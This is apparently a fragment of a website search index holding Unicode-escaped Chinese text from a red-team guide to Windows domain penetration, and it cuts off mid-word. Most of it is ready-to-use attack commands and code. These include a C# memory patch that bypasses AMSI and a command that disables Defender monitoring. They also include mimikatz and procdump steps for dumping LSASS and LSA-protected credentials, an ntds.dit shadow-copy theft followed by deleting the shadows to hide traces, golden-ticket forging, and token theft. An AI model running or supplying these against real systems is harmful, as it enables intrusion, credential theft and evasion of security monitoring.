\u5de5\u4f5c\u539f\u7406\uff1akali\u5728\u8bf7\u6c42\u5916\u7f51\u4e3b\u673a\u7684sshd\u670d\u52a1\uff0c\u5728\u5916\u7f51\u4e3b\u673a\u4e0a\u5efa\u7acb\u4e00\u4e2a\u5957\u63a5\u5b57\u76d1\u542c\u7aef\u53e3(4444)\uff0c\u5b83\u662fkali\u768480\u7aef\u53e3\u7684\u6620\u5c04\uff0c\u5f53\u6709\u4e3b\u673a\u8fde\u63a5\u5916\u7f51\u76844444\u7aef\u53e3\u65f6\uff0c\u8fde\u63a5\u7684\u6570\u636e\u5168\u90e8\u8f6c\u53d1\u7ed9kali\uff0c\u518d\u7531kali\u53bb\u8bbf\u95ee127.0.0.1:80\u3002 \u8fd9\u91cc\u8981\u6ce8\u610f\u4e00\u70b9\uff0c\u8fdc\u7a0b\u7aef\u53e3\u8f6c\u53d1\u662f\u7531\u8fdc\u7a0b\u4e3b\u673a\u4e0a\u7684sshd\u670d\u52a1\u63a7\u5236\u7684\uff0c\u9ed8\u8ba4\u914d\u7f6e\u60c5\u51b5\u4e0b\uff0csshd\u670d\u52a1\u53ea\u5141\u8bb8\u672c\u5730\u5f00\u542f\u7684\u8fdc\u7a0b\u8f6c\u53d1\u7aef\u53e3(4444)\u7ed1\u5b9a\u5728\u73af\u56de\u5730\u5740(127.0.0.1)\u4e0a\uff0c\u5373\u4f7f\u663e\u5f0f\u6307\u5b9a\u4e86bind_addr\u4e5f\u65e0\u6cd5\u8986\u76d6\u3002\u4e5f\u5c31\u662f\u8fd9\u91cc\u8bbf\u95ee127.0.0.1:4444\u7aef\u53e3\u53ef\u4ee5\u8bbf\u95ee\u6210\u529f\uff0c\u8bbf\u95ee192.168.183.195:4444\u5374\u4e0d\u80fd\u8bbf\u95ee\u6210\u529f\u3002 \u8981\u5141\u8bb8\u672c\u5730\u7684\u8fdc\u7a0b\u8f6c\u53d1\u7aef\u53e3\u7ed1\u5b9a\u5728\u975e\u73af\u56de\u5730\u5740\u4e0a\uff0c\u9700\u8981\u5728\u5916\u7f51\u4e3b\u673a\u7684sshd\u914d\u7f6e\u6587\u4ef6\u4e2d\u542f\u7528\u201dGatewayPorts\u201d\u9879\uff0c\u5b83\u7684\u9ed8\u8ba4\u503c\u4e3ano\uff0c\u8fd9\u91cc\u5c06\u5b83\u6539\u4e3ayes\u3002\u7136\u540e\u91cd\u65b0\u8fdc\u7a0b\u8f6c\u53d1\u4e00\u4e0b\u5373\u53ef\u7528\u5916\u7f51\u5730\u5740\u8bbf\u95ee\u3002 SSH\u52a8\u6001\u8f6c\u53d1,\u6b63\u5411\u4ee3\u7406\u505a\u52a8\u6001\u7684\u7aef\u53e3\u8f6c\u53d1 \u00b6 \u672c\u5730\u6216\u8fdc\u7a0b\u8f6c\u53d1\u7aef\u53e3\u548c\u76ee\u6807\u7aef\u53e3\u6240\u4ee3\u8868\u7684\u5e94\u7528\u5c42\u534f\u8bae\u662f\u4e00\u5bf9\u4e00\u7684\u5173\u7cfb\uff0c\u4e0d\u540c\u7684\u670d\u52a1\u5c31\u8981\u5efa\u7acb\u4e0d\u540c\u7684\u7aef\u53e3\uff0c\u5de5\u4f5c\u5f88\u662f\u7e41\u7410\uff0c\u800c\u52a8\u6001\u8f6c\u53d1\u53ea\u9700\u7ed1\u5b9a\u4e00\u4e2a\u672c\u5730\u7aef\u53e3\uff0c\u800c\u76ee\u6807\u7aef\u53e3\u662f\u6839\u636e\u4f60\u53d1\u8d77\u7684\u8bf7\u6c42\u51b3\u5b9a\u7684\uff0c\u6bd4\u5982\u8bf7\u6c42\u4e3a445\u7aef\u53e3\uff0c\u901a\u8fc7ssh\u8f6c\u53d1\u7684\u8bf7\u6c42\u4e5f\u662f445\u7aef\u53e3\u3002 \u8bed\u6cd5\u683c\u5f0f\uff1a ssh -D [bind_addr:]port remote \u8fd9\u91cc\u4e3e\u4e00\u4e2a\u6700\u7b80\u5355\u7684\u5217\u5b50\uff1a\u7ffb\u5899\u3002\u56fd\u5185\u6b63\u5e38\u60c5\u51b5\u4e0b\u4e0a\u4e0d\u4e86Google\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5c06\u6d41\u91cf\u8f6c\u53d1\u5230\u56fd\u5916\u7684vps\u4e0a\u8fd9\u6837\u5c31\u53ef\u4ee5\u6b63\u5e38\u8bbf\u95ee\u4e86\u3002 \u5728\u672c\u5730\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\uff0c\u5e76\u67e5\u770b\u5efa\u7acb\u8fde\u63a5\u60c5\u51b5 ssh -Nfg -D 3333 root@45.77.xx.xx \u8fde\u63a5\u5efa\u7acb\u6210\u529f\uff0c\u8bbe\u7f6e\u6d4f\u89c8\u5668\u5230\u672c\u5730\u4e3b\u673a\u76843333\u7aef\u53e3 SSH\u52a8\u6001\u8f6c\u53d1\uff0c\u6b63\u5411\u4ee3\u7406\u8fdb\u884c\u5355\u4e00\u7684\u7aef\u53e3\u8f6c\u53d1 \u00b6 \u5229\u7528ssh -L \u63d0\u4f9b\u6b63\u5411\u4ee3\u7406\uff0c\u5c06192.168.183.2\u768480\u7aef\u53e3\u6620\u5c04\u523045.77.xx.xx\u76841111\u7aef\u53e3\u4e0a \u8bbf\u95ee45.77.xx.xx:1111\u76f8\u5f53\u4e8e\u8bbf\u95ee192.168.183.2:80 \u4e2d\u95f4\u9700\u8981192.168.183.1\u7684ssh\u8fdb\u884c\u6b63\u5411\u4ee3\u7406\u8fdb\u884c\u5229\u7528\u3002 \u8bed\u6cd5\u683c\u5f0f\uff1a ssh -L 45.77.xx.xx:1111:192.168.183.2:80 root@192.168.183.1 \u6b64\u65f6\u6211\u4eec\u8bbf\u95ee45.77.xx.xx\u76841111\u7aef\u53e3\u5c31\u76f8\u5f53\u4e8e\u8bbf\u95ee\u5185\u7f51\u4e0d\u51fa\u7f51\u673a\u5668\u7684192.168.183.2:80 16.Bypass AMSI \u00b6 How to Bypass AMSI \u7ba1\u7406\u5458\u6743\u9650\u5173\u95edamsi Set-MpPreference -DisableRealtimeMonitoring $true \u4e00\u952e\u5173\u95edAMSI \u00b6 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPubilc,Static').SetValue($null,$true) \u88ab\u52a0\u9ed1\u4e86\uff0c\u53ef\u4ee5\u6df7\u6dc6\u8fc7 powershell\u964d\u7ea7 \u00b6 powershell.exe -version 2 //\u6539\u53d8powershell\u8fd0\u884c\u7248\u672c \u5185\u5b58\u8865\u4e01 \u00b6 $p=@\" using System; using System.Linq; using System.Runtime.InteropServices; public class Program { [DllImport(\"kernel32\")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); [DllImport(\"kernel32\")] public static extern IntPtr LoadLibrary(string name); [DllImport(\"kernel32\")] public static extern IntPtr VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpfloldProtect); public static void Bypass() { String a = \"isma\"; IntPtr lib = LoadLibrary(String.Join(\"\" , a.Reverse().ToArray()) + \" .dll\"); IntPtr addr = GetProcAddress(lib, \"AmsiOpenSession\"); uint old = 0; byte[] p; p = new byte[6]; p[0] = 0xB8; p[1] = 0xFF; p[2] = 0xFF; p[3] = 0xFF; p[4] = 0xFF; p[5] = 0xC3; VirtualProtect(addr, (UIntPtr)p.Length, 0x04, out old); Marshal.Copy(p, 0, addr, p.Length); VirtualProtect(addr, (UIntPtr)p.Length, old, out old); } } \"@ Add-Type $p [Program]::Bypass() \u53c2\u8003\u94fe\u63a5\uff1a https://github.com/NyDubh3/Pentesting-Active-Directory-CN https://github.com/shmilylty/Intranet_Penetration_Tips Peace. \u63d0\u4ea4 4 \u8bc4\u8bba Anonymous Chrome 97.0.4692.71 Windows 10.0 2 \u5929\u524d\u56de\u590d \u771f\u4e0d\u9519 Anonymous Chrome 97.0.4692.99 macOS 10.15.7 2022-02-10\u56de\u590d \u6309\u65f6\u5f52\u8fd8 Anonymous Chrome 96.0.4664.93 Windows 10.0 2022-01-27\u56de\u590d \u6309\u65f6\u5f52\u8fd8 Anonymous Chrome 97.0.4692.99 macOS 10.15.7 2022-01-27\u56de\u590d \u771f\u4e0d\u9519 Powered By Valine v1.4.16 Copyright \u00a9 2021-2022 0r@nge \u672c\u7ad9\u603b\u8bbf\u95ee\u91cf19025\u6b21","title":"\u57df\u6e17\u900f\u4e00\u6761\u9f99"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#1","text":"","title":"1.\u65e0\u51ed\u8bc1\u60c5\u51b5\u4e0b"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_1","text":"cme smb <ip_range> # SMB \u626b\u63cf\u5b58\u6d3b\u4e3b\u673a nmap -sP -p <ip> # ping \u626b\u63cf nmap -PN -sV --top-ports 50 --open <ip> # \u5feb\u901f\u626b\u63cf nmap -PN --script smb-vuln* -p139,445 <ip> # \u68c0\u6d4b SMB \u6f0f\u6d1e nmap -PN -sC -sV <ip> # \u7ecf\u5178\u626b\u63cf nmap -PN -sC -sV -p- <ip> # \u5168\u626b\u63cf nmap -sU -sC -sV <ip> # UDP \u626b\u63cf","title":"\u7f51\u7edc\u626b\u63cf"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_2","text":"\u626b\u63cf\u540e\u53ef\u4ee5\u53bb\u5148\u7528\u5df2\u77e5\u6f0f\u6d1e\u6253 java rmi\uff1a exploit/multi/misc/java_rmi_server ms17-010\uff1aexploit/windows/smb/ms17_010_eternalblue tomcat\uff1aauxiliary/scanner/http/tomcat_enum jboss manager\uff1aexploit/multi/http/tomcat_mgr_deploy Java\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u6d4b\u8bd5\uff1aysoserial \u67e5\u627e\u4ea7\u54c1\u7684CVE\u6f0f\u6d1e\uff1asearchsploit MS14-025\uff1a searchsploit findstr /S /I cpassword \\\\<FQDN>\\sysvol\\<FQDN>\\policies\\*.xml \u7206\u7834\u6570\u636e\u5e93\u8fde\u63a5\uff1ause admin/mssql/mssql_enum_sql_logins proxylogon\uff1a proxyshell\uff1a","title":"\u6f0f\u6d1e\u5feb\u901f\u63a2\u6d4b"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_3","text":"\u4f4e\u6743\u9650\u53ef\u4ee5\u505a\u7684\u4e8b\u60c5 winpeas.exe \u67e5\u627e\u5185\u5bb9\u6709 password \u7684\u6587\u4ef6\uff1afindstr /si 'password' *.txt *.xml *.docx Juicy Potato / Lovely Potato PrintSpoofer RoguePotato SMBGhost CVE-2020-0796 CVE-2021-36934 (HiveNightmare/SeriousSAM) ......","title":"\u63d0\u6743"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_4","text":"","title":"\u62e5\u6709\u672c\u5730\u7ba1\u7406\u5458\u6743\u9650"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_5","text":"procdump.exe -accepteula -ma lsass.exe lsass.dmp mimikatz \"privilege::debug\" \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonPasswords\" \"exit\" mimikatz \"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords\" \"lsadump::sam\" \"exit\" hashdump: post/windows/gather/smart_hashdump cme smb <ip_range> -u <user> -p <password> -M lsassy cme smb <ip_range> -u <user> -p '<password>' --sam / --lsa / --ntds","title":"\u83b7\u53d6\u5bc6\u7801"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#lsa","text":"PPLdump64.exe <lsass.exe|lsass_pid> lsass.dmp mimikatz \"!+\" \"!processprotect /process:lsass.exe /remove\" \"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords\" \"!processprotect /process:lsass.exe\" \"!-\" #with mimidriver.sys","title":"\u7ed5\u8fc7LSA\u9632\u62a4\u7b56\u7565\u8bfb\u53d6\u5bc6\u7801"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#token","text":".\\incognito.exe list_tokens -u .\\incognito.exe execute -c \"<domain>\\<user>\" powershell.exe use incognito impersonate_token <domain>\\\\<user> \u4e4b\u524d\u7c97\u7565\u5206\u6790\u8fc7 token Token\u7a83\u53d6\u90a3\u4e9b\u4e8b (0range-x.github.io)","title":"token\u7a83\u53d6"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_6","text":"lazagne.exe all","title":"\u67e5\u770b\u672c\u5730\u5b58\u50a8\u7684\u6240\u6709\u5bc6\u7801"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#hash","text":"diskshadow list shadows all mklink /d c:\\shadowcopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\ \u7ba1\u7406\u5458\u6743\u9650\u6267\u884c vssadmin create shadow /for=C: \u5229\u7528\u5377\u5f71\u526f\u672c\u5377\u540d\u62f7\u8d1dntds.dit\u6587\u4ef6\u4e0e\u7528\u6ce8\u518c\u8868\u5bfc\u51fasystem.hive copy \\\\?\\GLOBALLROOT\\Device\\xxxxxxxxxx\\windows\\ntds\\ntds.dit C:\\ntds.dit reg sava hklm\\system system.hive //\u5bfc\u51fasystem.hive\u6587\u4ef6\u5230\u6ce8\u518c\u8868 vssadmin delete shadows /for=C: /quiet //\u5220\u9664\u5377\u5f71\uff0c\u9690\u85cf\u75d5\u8ff9 CVE-2020-1472\u7684\u5206\u6790\u4e0e\u590d\u73b0 (0range-x.github.io)","title":"\u5377\u5f71\u62f7\u8d1d\uff08\u83b7\u53d6\u57df\u63a7\u6240\u6709hash\uff09"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#dpapi","text":"","title":"dpapi\u89e3\u5bc6"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#2","text":"","title":"2.\u5185\u7f51\u4fe1\u606f\u6536\u96c6"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_7","text":"1\u3001\u7528\u6237\u5217\u8868 net user /domain windows\u7528\u6237\u5217\u8868 \u5206\u6790\u90ae\u4ef6\u7528\u6237\uff0c\u5185\u7f51[\u57df]\u90ae\u4ef6\u7528\u6237\uff0c\u901a\u5e38\u5c31\u662f\u5185\u7f51[\u57df]\u7528\u6237 2.\u8fdb\u7a0b\u5217\u8868 tasklist /svc \u5206\u6790\u6740\u6bd2\u8f6f\u4ef6/\u5b89\u5168\u76d1\u63a7\u5de5\u5177\u7b49 \u90ae\u4ef6\u5ba2\u6237\u7aef VPN ftp\u7b49 3.\u670d\u52a1\u5217\u8868 tasklist /svc \u4e0e\u5b89\u5168\u9632\u8303\u5de5\u5177\u6709\u5173\u670d\u52a1[\u5224\u65ad\u662f\u5426\u53ef\u4ee5\u624b\u52a8\u5f00\u5173\u7b49] \u5b58\u5728\u95ee\u9898\u7684\u670d\u52a1[\u6743\u9650/\u6f0f\u6d1e] 4.\u7aef\u53e3\u5217\u8868 netstat -ano \u5f00\u653e\u7aef\u53e3\u5bf9\u5e94\u7684\u5e38\u89c1\u670d\u52a1/\u5e94\u7528\u7a0b\u5e8f[\u533f\u540d/\u6743\u9650/\u6f0f\u6d1e\u7b49] \u5229\u7528\u7aef\u53e3\u8fdb\u884c\u4fe1\u606f\u6536\u96c6 5.\u8865\u4e01\u5217\u8868 systeminfo \u5206\u6790 Windows \u8865\u4e01 \u7b2c\u4e09\u65b9\u8f6f\u4ef6[Java/Oracle/Flash \u7b49]\u6f0f\u6d1e 6.\u672c\u673a\u5171\u4eab smbclient -L ip net user \\\\ip\\c$ \u672c\u673a\u5171\u4eab\u5217\u8868/\u8bbf\u95ee\u6743\u9650 \u672c\u673a\u8bbf\u95ee\u7684\u57df\u5171\u4eab/\u8bbf\u95ee\u6743\u9650 7.\u672c\u7528\u6237\u4e60\u60ef\u5206\u6790 \u5386\u53f2\u8bb0\u5f55 \u6536\u85cf\u5939 \u6587\u6863\u7b49","title":"\u672c\u673a\u4fe1\u606f\u6536\u96c6"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#8","text":"","title":"8.\u83b7\u53d6\u5f53\u524d\u7528\u6237\u5bc6\u7801"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#windows","text":"mimikatz Invoke-WCMDump mimiDbg LaZagne NirLauncher ) quarkspwdump","title":"Windows"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#linux","text":"mimipenguin LaZagne","title":"Linux"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_8","text":"HackBrowserData SharpWeb SharpDPAPI 360SafeBrowsergetpass BrowserGhost Browser-cookie-steal(\u7a83\u53d6\u6d4f\u89c8\u5668cookie)","title":"\u6d4f\u89c8\u5668"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#navicat","text":"\u7248\u672c\uff1aNavicat 11\u621612 \u65b9\u6cd5\uff1a https://blog.csdn.net/CCESARE/article/details/104746596 \u89e3\u5bc6\u811a\u672c\uff1a https://github.com/tianhe1986/FatSmallTools https://github.com/HyperSine/how-does-navicat-encrypt-password","title":"Navicat\u5bc6\u7801"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#xshellxftp","text":"https://github.com/dzxs/Xdecrypt","title":"xshell&amp;xftp\u5bc6\u7801"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#mremoteng","text":"https://github.com/kmahyyg/mremoteng-decrypt https://github.com/haseebT/mRemoteNG-Decrypt","title":"mRemoteNG\u5bc6\u7801"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_9","text":"","title":"\u6269\u6563\u4fe1\u606f\u6536\u96c6"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_10","text":"nmap masscan zmap s\u626b\u63cf\u5668 \u81ea\u5199\u811a\u672c nc \u2026\u2026","title":"\u5e38\u7528\u7aef\u53e3\u626b\u63cf\u5de5\u5177"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_11","text":"DMZ \u7ba1\u7406\u7f51 \u751f\u4ea7\u7f51 \u6d4b\u8bd5\u7f51","title":"\u5185\u7f51\u62d3\u6251\u67b6\u6784\u5206\u6790"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_12","text":"ipconfig\uff1a ipconfig /all ------> \u67e5\u8be2\u672c\u673a IP \u6bb5\uff0c\u6240\u5728\u57df\u7b49 net net user ------> \u672c\u673a\u7528\u6237\u5217\u8868 net localgroup administrators ------> \u672c\u673a\u7ba1\u7406\u5458[\u901a\u5e38\u542b\u6709\u57df\u7528\u6237] net user /domain ------> \u67e5\u8be2\u57df\u7528\u6237 net group /domain ------> \u67e5\u8be2\u57df\u91cc\u9762\u7684\u5de5\u4f5c\u7ec4 net group \"domain admins\" /domain ------> \u67e5\u8be2\u57df\u7ba1\u7406\u5458\u7528\u6237\u7ec4 net localgroup administrators /domain ------> \u767b\u5f55\u672c\u673a\u7684\u57df\u7ba1\u7406\u5458 net localgroup administrators workgroup\\user001 /add ----->\u57df\u7528\u6237\u6dfb\u52a0\u5230\u672c\u673a net group \"Domain controllers\" -------> \u67e5\u770b\u57df\u63a7\u5236\u5668(\u5982\u679c\u6709\u591a\u53f0) net view ------> \u67e5\u8be2\u540c\u4e00\u57df\u5185\u673a\u5668\u5217\u8868 net view /domain ------> \u67e5\u8be2\u57df\u5217\u8868 net view /domain:domainname dsquery dsquery computer domainroot -limit 65535 && net group \"domain computers\" /domain ------> \u5217\u51fa\u8be5\u57df\u5185\u6240\u6709\u673a\u5668\u540d dsquery user domainroot -limit 65535 && net user /domain------>\u5217\u51fa\u8be5\u57df\u5185\u6240\u6709\u7528\u6237\u540d dsquery subnet ------>\u5217\u51fa\u8be5\u57df\u5185\u7f51\u6bb5\u5212\u5206 dsquery group && net group /domain ------>\u5217\u51fa\u8be5\u57df\u5185\u5206\u7ec4 dsquery ou ------>\u5217\u51fa\u8be5\u57df\u5185\u7ec4\u7ec7\u5355\u4f4d dsquery server && net time /domain------>\u5217\u51fa\u8be5\u57df\u5185\u57df\u63a7\u5236\u5668","title":"\u5e38\u89c1\u4fe1\u606f\u6536\u96c6\u547d\u4ee4"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_13","text":"NETBIOS \u4fe1\u606f\u6536\u96c6 SMB \u4fe1\u606f\u6536\u96c6 \u7a7a\u4f1a\u8bdd\u4fe1\u606f\u6536\u96c6 \u6f0f\u6d1e\u4fe1\u606f\u6536\u96c6\u7b49","title":"\u7b2c\u4e09\u65b9\u4fe1\u606f\u6536\u96c6"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#3","text":"","title":"3.\u83b7\u53d6\u57df\u63a7\u7684\u65b9\u6cd5"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#sysvol","text":"SYSVOL\u662f\u6307\u5b58\u50a8\u57df\u516c\u5171\u6587\u4ef6\u670d\u52a1\u5668\u526f\u672c\u7684\u5171\u4eab\u6587\u4ef6\u5939\uff0c\u5b83\u4eec\u5728\u57df\u4e2d\u6240\u6709\u7684\u57df\u63a7\u5236\u5668\u4e4b\u95f4\u590d\u5236\u3002 Sysvol\u6587\u4ef6\u5939\u662f\u5b89\u88c5AD\u65f6\u521b\u5efa\u7684\uff0c\u5b83\u7528\u6765\u5b58\u653eGPO\u3001Script\u7b49\u4fe1\u606f\u3002\u540c\u65f6\uff0c\u5b58\u653e\u5728Sysvol\u6587\u4ef6\u5939\u4e2d\u7684\u4fe1\u606f\uff0c\u4f1a\u590d\u5236\u5230\u57df\u4e2d\u6240\u6709DC\u4e0a\u3002 \u76f8\u5173\u9605\u8bfb: \u5bfb\u627eSYSVOL\u91cc\u7684\u5bc6\u7801\u548c\u653b\u51fbGPP\uff08\u7ec4\u7b56\u7565\u504f\u597d\uff09 Windows Server 2008 R2\u4e4b\u56db\u7ba1\u7406Sysvol\u6587\u4ef6\u5939 SYSVOL\u4e2d\u67e5\u627e\u5bc6\u7801\u5e76\u5229\u7528\u7ec4\u7b56\u7565\u9996\u9009\u9879 \u5229\u7528SYSVOL\u8fd8\u539f\u7ec4\u7b56\u7565\u4e2d\u4fdd\u5b58\u7684\u5bc6\u7801","title":"SYSVOL"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#ms14-068-kerberos","text":"python ms14-068.py -u \u57df\u7528\u6237@\u57df\u540d -p \u5bc6\u7801 -s \u7528\u6237SID -d \u57df\u4e3b\u673a \u5229\u7528mimikatz\u5c06\u5de5\u5177\u5f97\u5230\u7684 TGT_domainuser@SERVER.COM.ccache \u5199\u5165\u5185\u5b58\uff0c\u521b\u5efa\u7f13\u5b58\u8bc1\u4e66\uff1a mimikatz.exe \"kerberos::ptc c:TGT_darthsidious@pentest.com.ccache\" exit net use k: \\pentest.comc$ \u76f8\u5173\u9605\u8bfb : Kerberos\u7684\u5de5\u5177\u5305PyKEK \u6df1\u5165\u89e3\u8bfbMS14-068\u6f0f\u6d1e Kerberos\u7684\u5b89\u5168\u6f0f\u6d1e","title":"MS14-068 Kerberos"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#spn","text":"Kerberoast\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2a\u6709\u6548\u7684\u65b9\u6cd5\u4eceActive Directory\u4e2d\u4ee5\u666e\u901a\u7528\u6237\u7684\u8eab\u4efd\u63d0\u53d6\u670d\u52a1\u5e10\u6237\u51ed\u636e\uff0c\u65e0\u9700\u5411\u76ee\u6807\u7cfb\u7edf\u53d1\u9001\u4efb\u4f55\u6570\u636e\u5305\u3002 SPN\u662f\u670d\u52a1\u5728\u4f7f\u7528Kerberos\u8eab\u4efd\u9a8c\u8bc1\u7684\u7f51\u7edc\u4e0a\u7684\u552f\u4e00\u6807\u8bc6\u7b26\u3002\u5b83\u7531\u670d\u52a1\u7c7b\uff0c\u4e3b\u673a\u540d\u548c\u7aef\u53e3\u7ec4\u6210\u3002\u5728\u4f7f\u7528Kerberos\u8eab\u4efd\u9a8c\u8bc1\u7684\u7f51\u7edc\u4e2d\uff0c\u5fc5\u987b\u5728\u5185\u7f6e\u8ba1\u7b97\u673a\u5e10\u6237\uff08\u5982NetworkService\u6216LocalSystem\uff09\u6216\u7528\u6237\u5e10\u6237\u4e0b\u4e3a\u670d\u52a1\u5668\u6ce8\u518cSPN\u3002\u5bf9\u4e8e\u5185\u90e8\u5e10\u6237\uff0cSPN\u5c06\u81ea\u52a8\u8fdb\u884c\u6ce8\u518c\u3002\u4f46\u662f\uff0c\u5982\u679c\u5728\u57df\u7528\u6237\u5e10\u6237\u4e0b\u8fd0\u884c\u670d\u52a1\uff0c\u5219\u5fc5\u987b\u4e3a\u8981\u4f7f\u7528\u7684\u5e10\u6237\u7684\u624b\u52a8\u6ce8\u518cSPN\u3002 SPN\u626b\u63cf\u7684\u4e3b\u8981\u597d\u5904\u662f\uff0cSPN\u626b\u63cf\u4e0d\u9700\u8981\u8fde\u63a5\u5230\u7f51\u7edc\u4e0a\u7684\u6bcf\u4e2aIP\u6765\u68c0\u67e5\u670d\u52a1\u7aef\u53e3\uff0cSPN\u901a\u8fc7LDAP\u67e5\u8be2\u5411\u57df\u63a7\u6267\u884c\u670d\u52a1\u53d1\u73b0\uff0cSPN\u67e5\u8be2\u662fKerberos\u7684\u7968\u636e\u884c\u4e3a\u4e00\u90e8\u5206\uff0c\u56e0\u6b64\u6bd4\u8f83\u96be\u68c0\u6d4bSPN\u626b\u63cf\u3002 \u76f8\u5173\u9605\u8bfb : \u975e\u626b\u63cf\u5f0f\u7684SQL Server\u53d1\u73b0 SPN\u626b\u63cf \u626b\u63cfSQLServer\u7684\u811a\u672c","title":"SPN\u626b\u63cf"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#kerberos","text":"\u5728\u57df\u4e0a\u6293\u53d6\u7684\u54c8\u5e0c lsadump::dcsync /domain:pentest.com /user:krbtgt kerberos::purge kerberos::golden /admin:administrator /domain:\u57df /sid:SID /krbtgt:hash\u503c /ticket:adinistrator.kiribi kerberos::ptt administrator.kiribi kerberos::tgt net use k: \\pnet use k: \\pentest.comc$ \u76f8\u5173\u9605\u8bfb : https://adsecurity.org/?p=1640 \u57df\u670d\u52a1\u8d26\u53f7\u7834\u89e3\u5b9e\u8df5 Kerberos\u7684\u8ba4\u8bc1\u539f\u7406 \u6df1\u523b\u7406\u89e3windows\u5b89\u5168\u8ba4\u8bc1\u673a\u5236ntlm\uff06Kerberos","title":"Kerberos\u7684\u9ec4\u91d1\u95e8\u7968"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#kerberos_1","text":"\u9ec4\u91d1\u7968\u636e\u548c\u767d\u94f6\u7968\u636e\u7684\u4e00\u4e9b\u533a\u522b\uff1a Golden Ticket\uff1a\u4f2a\u9020 TGT \uff0c\u53ef\u4ee5\u83b7\u53d6 \u4efb\u4f55Kerberos \u670d\u52a1\u6743\u9650 \u94f6\u7968\uff1a\u4f2a\u9020TGS\uff0c \u53ea\u80fd\u8bbf\u95ee\u6307\u5b9a\u7684\u670d\u52a1 \u52a0\u5bc6\u65b9\u5f0f\u4e0d\u540c\uff1a Golden Ticket\u7531 krbtgt \u7684hash\u52a0\u5bc6 Silver Ticket\u7531 \u670d\u52a1\u8d26\u53f7 \uff08\u901a\u5e38\u4e3a\u8ba1\u7b97\u673a\u8d26\u6237\uff09Hash\u52a0\u5bc6 \u8ba4\u8bc1\u6d41\u7a0b\u4e0d\u540c\uff1a \u91d1\u7968\u5728\u4f7f\u7528\u7684\u8fc7\u7a0b\u9700\u8981\u540c\u57df\u63a7\u901a\u4fe1 \u94f6\u7968\u5728\u4f7f\u7528\u7684\u8fc7\u7a0b\u4e0d\u9700\u8981\u540c\u57df\u63a7\u901a\u4fe1 \u76f8\u5173\u9605\u8bfb : \u653b\u51fb\u8005\u5982\u4f55\u4f7f\u7528Kerberos\u7684\u94f6\u7968\u6765\u5229\u7528\u7cfb\u7edf \u57df\u6e17\u900f\u2014\u2014Pass The 